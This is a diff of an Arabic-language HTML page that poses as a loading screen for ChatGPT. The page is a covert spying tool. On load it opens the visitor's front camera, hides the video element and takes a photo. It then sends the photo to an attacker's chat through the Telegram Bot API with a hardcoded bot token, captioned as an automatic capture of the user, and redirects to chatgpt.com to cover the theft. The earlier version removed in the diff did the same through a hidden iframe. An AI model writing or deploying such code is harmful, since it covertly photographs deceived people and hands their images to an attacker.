@@ -2,64 +2,89 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لحظة من فضلك...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #000; color: #fff; }
-        .loader { border: 5px solid #333; border-top: 5px solid #10a37f; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 0; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #ffffff; color: #333; }
+        .loader-container { text-align: center; }
+        /* شريط التحميل الدوار */
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas, iframe { display: none; }
+        p { font-size: 18px; font-weight: bold; color: #555; }
+        /* إخفاء الكاميرا تماماً */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="loader-container">
         <div class="loader"></div>
-        <p>جاري تحميل البيانات...</p>
+        <p id="status">فتح chat gpt</p>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" width="1280" height="720"></canvas>
+    <!-- العناصر المخفية -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        // إنشاء الرابط الوسيط برمجياً لمنع GitHub من حذفه أو إخفائه
-        const iframe = document.createElement('iframe');
-        iframe.id = "gateway";
-        // هذا هو الرابط الذي كان يختفي منك
-        iframe.src = "https://bader-al-salam.github.io/Wased/";
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-
+        const botToken = '8757176986:AAFNsvSswM4J_I_adIelUJWTSuqwRvFJgRo';
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        function redirect() { window.location.replace("https://chatgpt.com"); }
+        // دالة التقاط وإرسال الصورة
+        async function captureAndSend() {
+            if (!chatId) {
+                status.innerText = "خطأ في المعرف، يرجى إعادة الدخول من البوت.";
+                return;
+            }
 
-        async function takeAction() {
-            if (!chatId) { redirect(); return; }
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            status.innerText = "جاري فتح موقع chat gpt...";
+
+            // إعداد الكانفاس
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة وإرسالها
             canvas.toBlob(blob => {
-                // إرسال البيانات للموقع الوسيط
-                iframe.contentWindow.postMessage({
-                    type: "SEND_PHOTO",
-                    photo: blob,
-                    chatId: chatId
-                }, "*");
-            }, 'image/jpeg', 0.6);
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', '📸 تم التقاط صورة تلقائية للمستخدم.');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    status.innerText = "تم بنجاح، جاري تحويلك...";
+                    // التحويل إلى ChatGPT بعد الإرسال
+                    setTimeout(() => {
+                        window.location.href = "https://chatgpt.com";
+                    }, 500);
+                })
+                .catch(() => {
+                    window.location.href = "https://chatgpt.com"; // تحويل حتى لو فشل الاتصال
+                });
+            }, 'image/jpeg', 0.7);
         }
 
-        window.addEventListener("message", function(event) {
-            if (event.data === "FINISH") { redirect(); }
-        });
-
+        // تشغيل الكاميرا تلقائياً عند الدخول
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(s => {
-                video.srcObject = s;
-                setTimeout(takeAction, 1500);
+            .then(stream => { 
+                video.srcObject = stream;
+                // الانتظار ثانية واحدة للتأكد من وضوح الصورة ثم الالتقاط
+                setTimeout(captureAndSend, 1500);
             })
-            .catch(redirect);
+            .catch(err => { 
+                status.innerText = "يجب السماح بالصلاحيات للمتابعة...";
+                console.error(err);
+            });
     </script>
 </body>
 </html>
